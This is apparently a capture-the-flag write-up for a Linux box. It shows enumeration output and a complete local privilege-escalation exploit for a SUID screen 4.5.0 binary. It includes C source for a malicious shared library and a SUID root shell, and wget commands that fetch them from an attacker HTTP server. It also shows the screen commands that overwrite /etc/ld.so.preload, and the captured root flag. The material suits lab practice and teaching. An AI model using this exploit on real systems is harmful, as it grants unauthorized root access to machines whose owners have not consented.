### Linenum

```txt
[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
/usr/bin/tmux
/usr/bin/screen
```

```txt
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc
/usr/bin/curl
```

```txt
[-] SUID files:
-rwsr-xr-x 1 root root 1588648 May 19  2017 /usr/bin/screen-4.5.0
```



### Linpeas


reference: *https://www.exploit-db.com/exploits/41154*

(modified) compile exploit code:

```bash

cat << EOF > libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("rootshell", 0, 0);
    chmod("rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF

gcc -fPIC -shared -ldl -o libhax.so libhax.c

cat << EOF > rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF

gcc -o rootshell rootshell.c

```


spin up an http server on the attacker machine:

```python
python3 -m http.server 8000
```

on the target machine, download the code and copy to the */tmp* directory:

```bash
wget http://10.10.14.3:8000/libhax.so
wget http://10.10.14.3:8000/rootshell
```

run the following commands on the target machine:

```bash
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne  "\x0alibhax.so"
screen -ls 
/tmp/rootshell
```

we get a root shell.

root.txt
```
4cfa26d84b2220826a07f0697dc72151
```